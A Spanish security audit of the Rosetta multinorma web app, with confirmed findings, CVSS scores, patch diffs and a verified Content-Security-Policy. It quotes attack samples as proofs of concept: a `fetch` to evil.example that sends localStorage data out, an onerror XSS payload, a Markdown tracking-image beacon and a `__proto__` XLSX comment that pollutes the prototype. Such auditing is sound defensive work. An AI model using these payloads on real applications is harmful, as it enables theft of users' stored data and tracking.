# Auditoría de seguridad — Rosetta multinorma 2.2.0

> **Informe original de la auditoría (1 de octubre de 2026).** Se conserva tal como se redactó, sobre el código de ese momento. Qué se ha corregido desde entonces y qué queda pendiente está en [AUDITORIA_PRODUCCION.md](../AUDITORIA_PRODUCCION.md). Las rutas a pruebas de concepto y scripts de medición se refieren al material de trabajo de la auditoría, que no se versiona.

**Alcance:** `src/` (10 módulos de `src/app`, motor, plantilla, CSS), `scripts/build.mjs`, `dist/index.html` y `.github/workflows/`.
**Referencia:** commit `dd328d6` (HEAD). Mientras se hacía la auditoría alguien cambió el árbol de trabajo (`00-i18n.js`, `01b-security.js`, `05b-inspector.js`, `07-events.js`, el motor y el catálogo: exclusiones no excluibles y nuevos sujetos NIS2). Esos cambios no tocan las líneas auditadas ni las de los parches. Los parches de este informe aplican tanto sobre HEAD como sobre el árbol actual (`git apply --check` sin errores).
**Método:** OWASP ASVS 4.0 nivel 2. Primero se revisó el código a mano y después se escribieron pruebas de concepto en Playwright/Chromium 1194 contra `dist/index.html`. Todas están en `scratchpad/audit-sec/`. Solo cuenta como **vulnerabilidad** lo que se reprodujo. Lo demás figura como *endurecimiento* o como *refutado*.
**No se ha modificado ningún fichero del repositorio.** Los parches se validaron en una copia (`scratchpad/audit-sec/patched/`) con `npm test` (57/57) y `npm run test:e2e` (16/16).

---

## 1. Resumen ejecutivo

La aplicación está bien defendida contra lo más grave en una SPA de este tipo:

- **No hay XSS.** Se revisaron los 25 sumideros `innerHTML`/plantillas. Además, una batería de pruebas puso cargas útiles en *todos* los campos de texto y las metió por las cuatro vías de entrada: restaurar una copia JSON, importar un proyecto JSON, importar la SoA del ENS en XLSX y escribir directamente en `localStorage`. No se ejecutó nada: 0 manejadores `on*`, 0 `<img>` inyectadas y 0 `javascript:`.
- **Tampoco hay contaminación de prototipos ni evasión del esquema.** `safeParse`, `sanitizeState` y `sanitizeWs` funcionan con listas blancas, y `setPath` solo admite rutas permitidas.
- Las celdas CSV con `=`, `+`, `-` o `@` se neutralizan, y el XLSX exportado no contiene ninguna fórmula.

Los riesgos reales están en el **entorno** de la aplicación y en la **cadena de suministro**:

| # | Hallazgo confirmado | Severidad |
|---|---|---|
| V-01 | La librería Excel se carga desde jsDelivr **sin SRI**. Si el CDN o el paquete se comprometen, el código atacante se ejecuta en el origen de la app y lee todos los proyectos (PoC reproducida). | **Alta** (CVSS 3.1: 6.8; prioridad 1 por el tipo de dato) |
| V-02 | Componente con CVE conocidas: `xlsx-js-style@1.2.0` = SheetJS CE **0.18.5**, abandonado desde 05/2022. **CVE-2023-30533** (contaminación de prototipos) reproducida en la librería. En la app la mitiga `Object.freeze(Object.prototype)`. CVE-2024-22363 (ReDoS) no reproducida. | Media (5.3) |
| V-03 | Datos reales **sin cifrar** en `localStorage`. **Con `file://`, cualquier otro HTML local abierto en el mismo Chromium lee todos los datos** (PoC). En GitHub Pages el origen `*.github.io` es compartido por todas las páginas de proyecto del mismo usuario. | Media (5.5) |
| V-04 | **Inyección Markdown** en el informe (`mdSafe` incompleto). Un SoA o JSON importado mete `![](https://atacante/…)` (balizas de seguimiento) o enlaces de *phishing* en el informe que se comparte. | Baja (4.3) |
| V-05 | **Google Fonts en cada carga**: la IP del usuario (y el origen como Referer en https) va a Google. Contradice el texto «Nada se envía a ningún servidor». La sentencia LG München I, 3 O 17493/20 (20-01-2022) lo consideró una infracción del RGPD. | Baja (3.7), riesgo de cumplimiento |

**Endurecimiento** (no es una vulnerabilidad reproducida, pero se recomienda):

- No hay CSP. Hay una CSP **verificada** con 0 violaciones, como cabecera y como `<meta>` generada por el build.
- Variantes de inyección de fórmulas: espacios o caracteres invisibles delante del `=`, o `＝` de ancho completo.
- Trusted Types (viable con una política propia).
- *Zip bomb* (la app falla de forma controlada).
- Restaurar una copia sobrescribe sin confirmación.
- `window.__ROSETTA__` en producción.
- Las *actions* de CI están fijadas por etiqueta y `npm audit` no cubre la librería del CDN.

**Prioridad de corrección:** V-01 (una línea), V-05 + CSP (plantilla y build), V-04 (una línea), V-03 (aviso ahora y cifrado en reposo en la hoja de ruta), V-02 (cambiar de librería para la lectura).

---

## 2. Tabla de hallazgos

| ID | Severidad (CVSS 3.1) | Ubicación (HEAD) | Estado | Evidencia |
|---|---|---|---|---|
| V-01 | Alta · 6.8 `AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:N` | `src/app/01-core.js:7`, `src/app/06-io.js:72-79` | **Confirmada** | `poc-sri.mjs`: con el bundle modificado, la versión original ejecuta el código y lee `["rosetta/v1/ws:616B","rosetta/v1/p/demo-hospital:27315B"]`. La versión parcheada da «Failed to find a valid digest in the 'integrity' attribute», no ejecuta nada y no lee nada. |
| V-02 | Media · 5.3 `AV:N/AC:H/PR:N/UI:R/S:U/C:N/I:H/A:L` (residual) | `src/app/01-core.js:7`, `src/app/06-io.js:181` y la función `ec()` del bundle (comentarios) | **Confirmada en la librería, mitigada en la app** | `node-proto.cjs`: `XLSX.version 0.18.5`, y tras leer `evil-soa.xlsx` (comentario `ref="__proto__"`) `({}).c = [{"a":"evil","t":"polluted",…}]`. En el navegador, `poc-xlsx.mjs` da `Object.prototype.c = undefined`, porque `07-events.js:253` congela el prototipo antes de cargar la librería. |
| V-03 | Media · 5.5 `AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N` | `src/app/01-core.js:44-48`, `src/app/06-io.js:242-245`, `.github/workflows/pages.yml` | **Confirmada** | `poc-extra.mjs` (c): `file:///…/otra-pagina.html` lee «2 claves; ws={"profile":{…}}» del `localStorage` de Rosetta. |
| V-04 | Baja · 4.3 `AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N` | `src/app/01b-security.js:87`, usado en `src/app/06-io.js:31-59` | **Confirmada** | `poc-xss.mjs` y `poc-xlsx.mjs`: `report.md` contiene `![t](https://evil.example/…)` intacto. La organización viene de la hoja «Portada» del XLSX importado. |
| V-05 | Baja · 3.7 `AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N` | `src/index.html:9-11`, `src/app/00-i18n.js:103,223` | **Confirmada** | `poc-extra.mjs` (b): al arrancar se pide `https://fonts.googleapis.com/css2?family=Bricolage+Grotesque…`. |
| H-01 | Endurecimiento | `src/index.html` (sin CSP ni cabeceras); despliegue en GitHub Pages | Verificada (falta) | `poc-csp.mjs`: la CSP recomendada da 0 violaciones; `poc-extra.mjs` (a): la CSP bloquea `script-src-attr`, `script-src-elem`, `img-src` y `connect-src` (exfiltración). |
| H-02 | Endurecimiento | `src/app/01b-security.js:85` | **No verificada** en Excel/LibreOffice (LibreOffice no arranca en el entorno) | `poc-xlsx.mjs`: el CSV conserva `" =3+4"` y `"\u200B=5+5"` sin la comilla; `＝1+1` (U+FF1D) también pasaría. |
| H-03 | Endurecimiento | 25 sumideros `innerHTML` (`03-shell.js` 13, `07-events.js` 8, `05-views.js` 2, `05b-inspector.js` 2) | Viabilidad comprobada | Con `require-trusted-types-for 'script'` la app no arranca: «This document requires 'TrustedHTML' assignment». Hace falta una política. |
| H-04 | Endurecimiento | `src/app/06-io.js:181`, `LIM.fileXlsx` (`01b-security.js:9`) | **Refutada** como vulnerabilidad | `poc-bomb.mjs`: 0,8 MB → 541 MB descomprimidos tardan 9,1 s y terminan en un error controlado. 3,1 MB → 3 GB dan «Array buffer allocation failed», controlado y sin *crash*. |
| H-05 | Endurecimiento | `src/app/06-io.js:246-252` | Comportamiento confirmado; impacto bajo | `restoreBackup` sustituye el perfil y los ajustes, y pisa proyectos con el mismo `id`, sin pedir confirmación. |
| H-06 | Endurecimiento | `src/app/07-events.js:259` | — | `window.__ROSETTA__` expone el estado. No añade acceso más allá del mismo origen, pero sobra en producción. |
| H-07 | Endurecimiento | `src/app/07-events.js:253` | — | Solo se congela `Object.prototype`; `Array.prototype` y `Function.prototype` no (`arrayProtoFrozen:false`). |
| H-08 | Endurecimiento | `.github/workflows/*.yml` | — | *Actions* fijadas por etiqueta (`@v4`) y no por SHA. `npm audit` no ve la librería del CDN, así que la «auditoría semanal» no detecta CVE como las de V-02. |
| R-01 | — | Todos los sumideros de `src/app/*.js` | **Refutada** (sin XSS) | `poc-xss.mjs`: `{"hits":[],"onAttrs":0,"imgs":0,"jsHref":0}`. El *payload* aparece como texto («sanity: true»). Se probaron los colores/acentos hostiles en la copia y en `localStorage` y se normalizan a `rosa`. |
| R-02 | — | `src/app/07-events.js:252-253`, `01b-security.js:18` | **Refutada** | El único parseo anterior al *freeze* es `store.get(WS_KEY)` → `JSON.parse`. `JSON.parse` no contamina: `__proto__` queda como propiedad propia y además lo elimina el *reviver*, y `sanitizeWs` reconstruye el objeto. La copia con `__proto__`/`constructor` da `({}).polluted === undefined`. |
| R-03 | — | Exportación XLSX `src/app/06-io.js:81-149` | **Refutada** | Leído con `cellFormula:true`: **0 fórmulas**. Las 52 cadenas que empiezan por `=` son de tipo `s` (texto). |
| R-04 | — | Tooltip `07-events.js:143`, toast `03-shell.js:196`, paleta `03-shell.js:176-181`, gráficos SVG `05-views.js:58-135` | **Refutada** | Tooltip con `textContent`, toast/paleta con `esc()`, SVG solo con números y textos escapados. |

---

## 3. Detalle y parches de los hallazgos confirmados

> Los parches son diffs unificados contra `src/` y `scripts/` (HEAD `dd328d6`). El diff completo y probado está en `scratchpad/audit-sec/patches-src.diff`. Después hay que ejecutar `npm run build` y versionar `dist/index.html`.

### V-01 — Librería Excel desde CDN sin integridad (SRI)

`loadXLSX()` (`06-io.js:72-79`) crea un `<script src="https://cdn.jsdelivr.net/npm/xlsx-js-style@1.2.0/dist/xlsx.bundle.js">` sin `integrity` ni `crossorigin`. El script se ejecuta en el mismo origen que los datos y tiene acceso completo a `localStorage` y a `window.__ROSETTA__`.

Basta con que el CDN, el paquete npm (cuenta del mantenedor) o un proxy TLS corporativo cambien el fichero para exfiltrar todas las SoA. La PoC `poc-sri.mjs` lo hace: añade una línea al bundle y lee todas las claves. Con la versión original el ataque funciona; con la parcheada el navegador bloquea el script.

El SRI se calculó sobre el fichero del tarball npm de `xlsx-js-style@1.2.0` (jsDelivr sirve exactamente esos bytes):
`sha384-OUW9euuUyxyHcAhTqbhI+Iyb8LMssXt/cpz0yXhs9UWG2/R/uaWdakx/4cfww7Vb`

```diff
--- a/src/app/01-core.js
+++ b/src/app/01-core.js
@@ -5,6 +5,7 @@ const IX = E.indexar(D.catalog);
 const CAT = D.catalog;
 const FW = E.FW;
 const XLSX_URL = 'https://cdn.jsdelivr.net/npm/xlsx-js-style@1.2.0/dist/xlsx.bundle.js';
+const XLSX_SRI = 'sha384-OUW9euuUyxyHcAhTqbhI+Iyb8LMssXt/cpz0yXhs9UWG2/R/uaWdakx/4cfww7Vb'; // integridad del fichero exacto (SRI)
 const VERSION = '2.2.0';
 const DOM = Object.fromEntries(CAT.domains.map((d) => [d.id, d]));
 const SOLAPE = E.solapamiento(IX);
--- a/src/app/06-io.js
+++ b/src/app/06-io.js
@@ -73,6 +73,7 @@ function loadXLSX() {
   if (window.XLSX) return Promise.resolve(window.XLSX);
   return new Promise((res, rej) => {
     const sc = document.createElement('script'); sc.src = XLSX_URL; sc.async = true;
+    sc.integrity = XLSX_SRI; sc.crossOrigin = 'anonymous'; sc.referrerPolicy = 'no-referrer'; // el navegador rechaza el fichero si cambia un solo byte
     sc.onload = () => (window.XLSX ? res(window.XLSX) : rej(new Error(t('tXlsxLib'))));
     sc.onerror = () => rej(new Error(t('tXlsxLib')));
     document.head.appendChild(sc);
```

La importación y la exportación siguen funcionando con el parche (`poc-xlsx.mjs` sobre `patched/dist`). Nota sobre `file://`: jsDelivr envía `Access-Control-Allow-Origin: *`, así que la carga CORS anónima también funciona abriendo el fichero desde disco.

**Mejor aún:** servir la librería **desde el propio dominio** (*vendoring*), también con SRI, y quitar el CDN de la CSP.

### V-02 — SheetJS CE 0.18.5 con CVE conocidas (paquete abandonado)

- `xlsx-js-style@1.2.0` (última versión, publicada el 2022-05-25) incluye `XLSX.version = "0.18.5"`.
- **CVE-2023-30533** (contaminación de prototipos al leer ficheros manipulados; corregida en 0.19.3), reproducida. La función de comentarios del bundle hace `c = s[e.ref]` y después `c.c || (c.c = [])` con `e.ref` sacado del XML. Con `<comment ref="__proto__">` (`out/evil-soa.xlsx`), en Node queda `Object.prototype.c = [{a:"evil",t:"polluted",…}]`.
- **En la app no se explota:** `07-events.js:253` congela `Object.prototype` *antes* de la primera carga de la librería, y `poc-xlsx.mjs` confirma `({}).c === undefined`. Esa es la única barrera: si el *freeze* falla (el código lo ignora con `try/catch`) o se mueve, la contaminación vuelve.
- **CVE-2024-22363** (ReDoS; corregida en 0.20.2): no reproducida, porque no hay un vector público concreto. Se resuelve igual al actualizar.

**Corrección recomendada** (separar lectura y escritura):

1. **Lectura** (`leerSoaEns`, la superficie expuesta a ficheros de terceros): SheetJS CE **≥ 0.20.3**, servida desde el propio dominio. Se descarga de `https://cdn.sheetjs.com/xlsx-0.20.3/package/dist/xlsx.full.min.js`; npm se quedó en 0.18.5. Se calcula su SRI con `openssl dgst -sha384 -binary xlsx.full.min.js | openssl base64 -A`.
2. **Escritura** (`exportXlsx`, que solo procesa el estado ya saneado): puede seguir usando `xlsx-js-style` (con SRI, V-01) por los estilos, o pasar a 0.20.3 y perder el color de las celdas.
3. Añadir a CI una comprobación de que la versión y el SRI del vendor coinciden con lo esperado. `npm audit` no lo cubre (H-08).

El diff mínimo, cuando el fichero esté en el repositorio (el SRI se calcula en ese momento):

```diff
--- a/src/app/01-core.js
+++ b/src/app/01-core.js
@@
 const XLSX_URL = 'https://cdn.jsdelivr.net/npm/xlsx-js-style@1.2.0/dist/xlsx.bundle.js';
+const XLSX_READ_URL = 'vendor/xlsx-0.20.3.full.min.js';   // SheetJS CE parcheada, servida desde el propio dominio
+const XLSX_READ_SRI = 'sha384-<calcular al versionar>';
--- a/src/app/06-io.js
+++ b/src/app/06-io.js
@@
-function loadXLSX() {
-  if (window.XLSX) return Promise.resolve(window.XLSX);
+function loadXLSX(url = XLSX_URL, sri = XLSX_SRI) {
+  if (window.XLSX && window.XLSX.__src === url) return Promise.resolve(window.XLSX);
   return new Promise((res, rej) => {
-    const sc = document.createElement('script'); sc.src = XLSX_URL; sc.async = true;
+    const sc = document.createElement('script'); sc.src = url; sc.async = true;
+    sc.integrity = sri; sc.crossOrigin = 'anonymous'; sc.referrerPolicy = 'no-referrer';
-    sc.onload = () => (window.XLSX ? res(window.XLSX) : rej(new Error(t('tXlsxLib'))));
+    sc.onload = () => (window.XLSX ? (window.XLSX.__src = url, res(window.XLSX)) : rej(new Error(t('tXlsxLib'))));
@@ async function leerSoaEns(file) {
-  const X = await loadXLSX();
+  const X = await loadXLSX(XLSX_READ_URL, XLSX_READ_SRI);
```

(En `file://` la ruta relativa `vendor/…` con `crossorigin` falla por CORS. Si hace falta seguir usándolo desde disco, conviene incrustar el vendor en `dist` como un bloque `<script>` más, cubierto por la CSP con su hash.)

### V-03 — Datos sin cifrar en `localStorage` y origen compartido

- `store.set` (`01-core.js:46`) guarda en claro el JSON de cada proyecto: responsables, evidencias, exclusiones y SoA. El fichero de copia (`06-io.js:242-245`) también va en claro y contiene el perfil (incluido el correo).
- **`file://` en Chromium:** todos los ficheros locales comparten el almacenamiento. La PoC abre `dist/index.html`, crea datos y después abre `out/otra-pagina.html`, que lee `rosetta/v1/ws` y `rosetta/v1/p/*`. El build anuncia expresamente que la app funciona «abriéndolo directamente desde el disco». Basta con que la víctima abra en el mismo navegador cualquier adjunto HTML.
- **GitHub Pages** (`pages.yml`): la app quedaría en `https://<usuario>.github.io/rosetta_multinorma/`, cuyo origen es `https://<usuario>.github.io`, **compartido con todas las páginas de proyecto de esa cuenta**. Un XSS o un script de terceros en cualquiera de ellas lee los datos de Rosetta.
- En un equipo compartido con el mismo perfil de navegador, cualquiera que use ese perfil lo lee todo (DevTools o el fichero LevelDB en disco).

**Parche mínimo (aplicado y probado):** decir la verdad en la interfaz y avisar cuando se usa desde `file://`.

```diff
--- a/src/app/00-i18n.js
+++ b/src/app/00-i18n.js
@@ -100,7 +100,7 @@ const I18N = {
-    dataPriv: 'Datos y privacidad', dataPrivTxt: 'Todo se guarda en este navegador. Nada se envía a ningún servidor. Haz copias con regularidad.', backup: 'Copia de seguridad', backupHint: 'Perfil, ajustes y proyectos en un único fichero JSON.',
+    dataPriv: 'Datos y privacidad', dataPrivTxt: 'Todo se guarda en este navegador, sin cifrar. Nada se envía a ningún servidor. Haz copias con regularidad.', fileWarn: 'Estás usando Rosetta abierto como fichero local (file://): cualquier otro HTML que abras desde el disco en este navegador puede leer estos datos. Para datos reales, publícalo en un servidor (npm run serve) o en un dominio propio.', backup: 'Copia de seguridad', backupHint: 'Perfil, ajustes y proyectos en un único fichero JSON.',
@@ -220,7 +220,7 @@ const I18N = {
-    dataPriv: 'Data and privacy', dataPrivTxt: 'Everything is stored in this browser. Nothing is sent to any server. Back up regularly.', backup: 'Backup', backupHint: 'Profile, settings and projects in one JSON file.',
+    dataPriv: 'Data and privacy', dataPrivTxt: 'Everything is stored in this browser, unencrypted. Nothing is sent to any server. Back up regularly.', fileWarn: 'You are running Rosetta as a local file (file://): any other HTML file you open from disk in this browser can read this data. For real data, serve it (npm run serve) or host it on its own domain.', backup: 'Backup', backupHint: 'Profile, settings and projects in one JSON file.',
--- a/src/app/04-global.js
+++ b/src/app/04-global.js
@@ -145,7 +145,7 @@ function vAjustes() {
-    <section class="glass pane"><h3>${esc(t('dataPriv'))}</h3><p class="small muted" style="margin:6px 0">${esc(t('dataPrivTxt'))}</p>
+    <section class="glass pane"><h3>${esc(t('dataPriv'))}</h3><p class="small muted" style="margin:6px 0">${esc(t('dataPrivTxt'))}</p>${location.protocol === 'file:' ? `<div class="alert">${icon('triangle-alert', 16)}${esc(t('fileWarn'))}</div>` : ''}
```

**Corrección de fondo (hoja de ruta; diseño propuesto, no aplicado):**

1. **Despliegue:** usar un origen dedicado, por ejemplo un dominio propio (`rosetta.ejemplo.es`) o un subdominio aislado, y **no** `usuario.github.io`. Documentar que con datos reales no se use `file://`.
2. **Cifrado en reposo con frase de paso (WebCrypto):**
   - **Clave:** PBKDF2-SHA-256 con ≥ 600 000 iteraciones y sal de 16 bytes aleatoria, de la que sale una clave AES-GCM-256 creada con `extractable:false`. Solo vive en memoria (opcionalmente en IndexedDB como `CryptoKey` no extraíble, con desbloqueo por sesión).
   - **Formato:** cada valor se guarda como `{v:1, alg:'AES-GCM', iv:<12 B>, ct:<base64>}` y la sal en `rosetta/v1/kdf`. Se usa un IV nuevo en cada escritura y la clave del registro (`rosetta/v1/p/<id>`) como `additionalData`, para que no se puedan intercambiar blobs entre proyectos.
   - **Integración:** `store.get` es síncrono. Lo práctico es descifrarlo todo al desbloquear y cargarlo en `MEM`. A partir de ahí `store.get` lee de `MEM` y `store.set` escribe en `MEM` y lanza el cifrado y el `setItem` asíncronos (ya hay un *debounce* de 200 ms en `saveProject`).
   - **Copias:** el mismo formato, con su propia sal, y frase obligatoria (o desactivable con un aviso explícito).
   - **Retención:** bloqueo automático por inactividad (por ejemplo 15 min; se borra `MEM` y se olvida la clave), «Borrar todos los datos» que también elimine la sal, y aviso de antigüedad de las copias.
   - **Límite:** esto protege frente a quien comparte el equipo o el perfil y frente a la lectura en frío del disco. No protege frente a un script que ya se ejecute en el origen mientras la sesión está desbloqueada; para eso sirven V-01 y la CSP.
3. **IndexedDB:** no aporta confidencialidad por sí sola (mismo origen), pero permite guardar la `CryptoKey` no extraíble y blobs más grandes.

### V-04 — Inyección Markdown en el informe

`mdSafe` (`01b-security.js:87`) solo neutraliza `<`, `>`, `|` y los saltos de línea. Las imágenes y los enlaces Markdown llegan intactos al informe. Por ejemplo, `organizacion = "ACME ![x](https://evil.example/beacon.png)"`, que puede venir de la hoja «Portada» de un XLSX de terceros (`06-io.js:204`) o de un JSON importado, termina en el título del informe (`06-io.js:31`).

Al abrir el `.md` en GitHub, GitLab, Confluence, VS Code o similares, la imagen se carga sola: es una baliza que confirma la apertura y filtra la IP. También se pueden insertar enlaces engañosos en la tabla de alertas (`h.titulo` y `h.detalle` incluyen datos del usuario).

```diff
--- a/src/app/01b-security.js
+++ b/src/app/01b-security.js
@@ -84,6 +84,6 @@
-/* Markdown: se neutraliza HTML incrustado y las barras de tabla */
-const mdSafe = (v) => String(v ?? '').replace(/[<>]/g, (c) => (c === '<' ? '&lt;' : '&gt;')).replace(/\|/g, '/').replace(/\r?\n/g, ' ');
+/* Markdown: se neutraliza HTML incrustado, enlaces/imágenes ([ ] !), énfasis y las barras de tabla */
+const mdSafe = (v) => String(v ?? '').replace(/[\\`*_[\]!]/g, '\\$&').replace(/[<>]/g, (c) => (c === '<' ? '&lt;' : '&gt;')).replace(/\|/g, '/').replace(/[\r\n]+/g, ' ');
```

Tras el parche, el informe contiene `\!\[t\](https://evil.e…`, que se ve como texto literal (verificado con `poc-xss.mjs` sobre `patched/dist`).

### V-05 — Google Fonts (fuga de IP a terceros, RGPD)

`src/index.html:9-11` carga CSS y fuentes de `fonts.googleapis.com` y `fonts.gstatic.com` **en cada arranque**. Eso transmite a Google la IP del usuario y, servido por https, el origen como `Referer`. Además, la interfaz afirma «Nada se envía a ningún servidor».

Para una herramienta de cumplimiento usada por organismos públicos españoles es un riesgo legal directo: la sentencia **LG München I, 3 O 17493/20** condenó a pagar daños por incrustar Google Fonts de forma dinámica sin consentimiento.

```diff
--- a/src/index.html
+++ b/src/index.html
@@ -2,13 +2,12 @@
 <html lang="es">
 <head>
 <meta charset="utf-8">
+<!-- @csp -->
+<meta name="referrer" content="no-referrer">
 <meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
@@
-<link rel="preconnect" href="https://fonts.googleapis.com">
-<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Bricolage+Grotesque:opsz,wdth,wght@12..96,75..100,400..800&family=Onest:wght@400..700&family=Martian+Mono:wdth,wght@75..100,400..600&display=swap">
 <style>
```

El CSS ya trae pilas de reserva (`--f-display: …, ui-sans-serif, system-ui, …`, `--f-mono: …, ui-monospace, …`), así que el parche mínimo no rompe nada. La e2e pasa.

Para conservar la tipografía, conviene **servir las fuentes desde el propio sitio**: los WOFF2 de Bricolage Grotesque, Onest y Martian Mono (licencia OFL) en `src/fonts/`, con `@font-face` en el CSS e incrustados por el build como `data:` (y entonces `font-src data:` en la CSP), o servidos junto a `dist/` (`font-src 'self'`). jsDelivr queda como único tercero, solo bajo demanda y con SRI (V-01), o desaparece con el *vendoring* (V-02).

---

## 4. CSP verificada y cabeceras recomendadas

### 4.1 Cómo se verificó

- **Hashes calculados con Node** sobre el `dist/index.html` de HEAD (sha256 del fichero `608fc3b95a250124…`):

  | Bloque | Tamaño | Hash |
  |---|---|---|
  | `<style>` | 81 141 B | `sha256-h2gjetsKAV33HuUBrKWE/wBRbSzx6qkhtwjEML1FxHg=` |
  | `<script>` 1 (datos) | 281 959 B | `sha256-U+E3c4W3tgytDpmK5pbDBGUdiZQCJ660rQL+hcED+6U=` |
  | `<script>` 2 (motor) | 31 988 B | `sha256-3flNC5lFFy+NykcGu4QvkrVMq4i80T/j6x4+FBmi/+s=` |
  | `<script>` 3 (app) | 209 522 B | `sha256-gGstkST8t1lkUAx9FbYVCz67gNZGSug/lDV+wLXoPUU=` |

- **Prueba** (`poc-csp.mjs`): un servidor Node envía `dist/` con la cabecera y Playwright recorre la app. Hace lo siguiente:
  - abre el caso TechServ y las 14 vistas, el inspector, la paleta, los menús y el cambio de tema;
  - exporta XLSX (carga la librería del CDN), MD, CSV ×2 y JSON;
  - importa la SoA en XLSX y restaura una copia JSON.

  En paralelo recoge los eventos `securitypolicyviolation` y la consola.

| Modo | Resultado |
|---|---|
| Cabecera HTTP | **Funciona.** Todos los pasos OK, **0 violaciones**, 0 errores. |
| `<meta http-equiv>` (sin `frame-ancestors`) | **Funciona.** 0 violaciones. |
| Sin `style-src-attr 'unsafe-inline'` | 1696 violaciones de `style-src-attr` (la app usa `style="…"` en sus plantillas), aunque es funcional. Por eso se mantiene `style-src-attr 'unsafe-inline'`, que solo afecta a atributos de estilo y no permite ejecutar script. |
| Con `require-trusted-types-for 'script'` | La app **no arranca** («requires 'TrustedHTML' assignment»). Ver H-03. |

- **Eficacia** (`poc-extra.mjs` (a)): con la CSP activa, `insertAdjacentHTML('<img src=x onerror=…>')` no se ejecuta y `fetch('https://evil.example', {body: localStorage…})` se bloquea. Violaciones: `script-src-attr`, `script-src-elem`, `img-src` y `connect-src`.

### 4.2 Cabecera para el `dist/index.html` actual (HEAD, sin parches)

```
Content-Security-Policy: default-src 'none'; script-src 'sha256-U+E3c4W3tgytDpmK5pbDBGUdiZQCJ660rQL+hcED+6U=' 'sha256-3flNC5lFFy+NykcGu4QvkrVMq4i80T/j6x4+FBmi/+s=' 'sha256-gGstkST8t1lkUAx9FbYVCz67gNZGSug/lDV+wLXoPUU=' https://cdn.jsdelivr.net/npm/xlsx-js-style@1.2.0/dist/xlsx.bundle.js; style-src 'sha256-h2gjetsKAV33HuUBrKWE/wBRbSzx6qkhtwjEML1FxHg=' https://fonts.googleapis.com; style-src-attr 'unsafe-inline'; font-src https://fonts.gstatic.com; img-src data:; connect-src 'none'; object-src 'none'; base-uri 'none'; form-action 'none'; manifest-src 'none'; worker-src 'none'; frame-ancestors 'none'
Referrer-Policy: no-referrer
X-Content-Type-Options: nosniff
Permissions-Policy: camera=(), microphone=(), geolocation=(), usb=(), payment=(), interest-cohort=()
Cross-Origin-Opener-Policy: same-origin
Strict-Transport-Security: max-age=31536000; includeSubDomains
```

Notas:

- **Los hashes cambian en cada build.** Lo práctico es que los calcule el build (4.3).
- `script-src` admite la URL **exacta** de la librería. Con el *vendoring* (V-02) se sustituye por `'self'` o se quita.
- `img-src data:` es necesario para el favicon `data:`. Las descargas usan `blob:` por navegación con `download`, que no está sujeta a `img-src`/`connect-src`.
- Cuando se apliquen V-05 y el *vendoring*: quitar `https://fonts.googleapis.com` y `font-src https://fonts.gstatic.com` (pasa a `font-src 'none'`, o `data:` si las fuentes se incrustan).

### 4.3 CSP generada por el build como `<meta>` (necesaria para GitHub Pages y `file://`)

GitHub Pages **no permite cabeceras propias** y el modo `file://` tampoco las tiene. La única forma de tener CSP en ambos casos es un `<meta http-equiv>` situado antes de cualquier script. Este parche la genera con los hashes del documento final. `frame-ancestors` no está disponible en `<meta>`: el riesgo de *clickjacking* es bajo, porque las acciones destructivas piden confirmación en dos pasos.

```diff
--- a/scripts/build.mjs
+++ b/scripts/build.mjs
@@ -36,7 +36,17 @@ export function buildModules(dir) {
   return files.map((f) => `/* ===== ${f} ===== */\n${stripEnd(rd(join(dir, f)))}`).join('\n');
 }
 
-export function build() {
+/* CSP por <meta>: hashes SHA-256 de cada <script>/<style> en línea del documento final.
+ * Va en <meta> porque GitHub Pages y el uso desde disco no permiten cabeceras HTTP. */
+export const XLSX_CDN = 'https://cdn.jsdelivr.net/npm/xlsx-js-style@1.2.0/dist/xlsx.bundle.js';
+export function cspFor(html) {
+  const h = (kind) => [...html.matchAll(new RegExp(`<${kind}>([\\s\\S]*?)</${kind}>`, 'g'))]
+    .map((m) => `'sha256-${createHash('sha256').update(m[1], 'utf8').digest('base64')}'`).join(' ');
+  return ["default-src 'none'", `script-src ${h('script')} ${XLSX_CDN}`, `style-src ${h('style')}`, "style-src-attr 'unsafe-inline'",
+    'img-src data:', "font-src 'none'", "connect-src 'none'", "object-src 'none'", "base-uri 'none'", "form-action 'none'", "manifest-src 'none'", "worker-src 'none'"].join('; ');
+}
+
+export function build({ csp = true } = {}) {
   const tpl = rd('src/index.html');
   const out = tpl.replace(/^[ \t]*(.*?)<!-- @(inline|data|modules) ([^>]+?) -->(.*)$/gm, (_, pre, kind, arg, post) => {
     const a = arg.trim();
@@ -48,8 +58,10 @@ export function build() {
     else body = buildModules(a);
     return pre + body + post;
   });
-  if (/<!-- @/.test(out)) throw new Error('Quedan directivas sin resolver en la plantilla');
-  return out;
+  const meta = csp ? `<meta http-equiv="Content-Security-Policy" content="${cspFor(out)}">` : '';
+  const fin = out.replace(/^<!-- @csp -->\n/m, meta ? meta + '\n' : '');
+  if (/<!-- @/.test(fin)) throw new Error('Quedan directivas sin resolver en la plantilla');
+  return fin;
 }
 
 const isMain = process.argv[1] && resolve(process.argv[1]) === fileURLToPath(import.meta.url);
@@ -57,7 +69,7 @@ if (isMain) {
   const args = process.argv.slice(2);
   const oi = args.indexOf('--out');
   const outPath = resolve(ROOT, oi >= 0 ? args[oi + 1] : 'dist/index.html');
-  const html = build();
+  const html = build({ csp: !args.includes('--no-csp') }); // --no-csp: p. ej. para publicarlo como artefacto con su propia CSP
   const sha = createHash('sha256').update(html).digest('hex').slice(0, 16);
```

(La plantilla ya recibe `<!-- @csp -->` y `<meta name="referrer" content="no-referrer">` en el parche de V-05.)

**Validación con todos los parches aplicados:**

- `npm run check` y `npm test` (57/57) pasan.
- `npm run test:e2e` (16/16) pasa en `file://` con la `<meta>` CSP activa.
- `poc-csp.mjs header` sobre `patched/dist` da 0 violaciones con importación y exportación XLSX incluidas.
- La CSP resultante en `patched/dist`: `default-src 'none'; script-src 'sha256-U+E3…' 'sha256-3flN…' 'sha256-X276ZaYCkvjFLtVAaUvYT0H5y1bp8YrPETadH2DYOVo=' https://cdn.jsdelivr.net/npm/xlsx-js-style@1.2.0/dist/xlsx.bundle.js; style-src 'sha256-h2gj…'; style-src-attr 'unsafe-inline'; img-src data:; font-src 'none'; connect-src 'none'; …`

